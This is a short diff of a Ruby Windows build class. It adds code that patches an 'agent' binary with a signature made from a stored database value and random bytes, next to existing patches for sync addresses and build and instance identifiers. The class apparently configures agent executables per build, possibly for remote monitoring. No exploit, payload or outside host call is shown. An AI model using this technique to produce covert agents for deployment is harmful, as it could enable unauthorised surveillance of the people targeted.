@@ -222,6 +222,10 @@ class BuildWindows < Build
         raise "address2 not found" if offset.nil?
         content.binary_patch_at_offset offset, params[:sync][1]
 
+        sign = ::Signature.where({scope: 'agent'}).first
+        signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
+        content.binary_patch '3j9WmmDgBqyU270FTid3719g64bP4s52', signature
+
         content.binary_patch "\xe1\xbe\xad\xde", [params[:build]].pack('I')
         content.binary_patch "\xe2\xbe\xad\xde", [params[:instance]].pack('I')
       rescue Exception => e
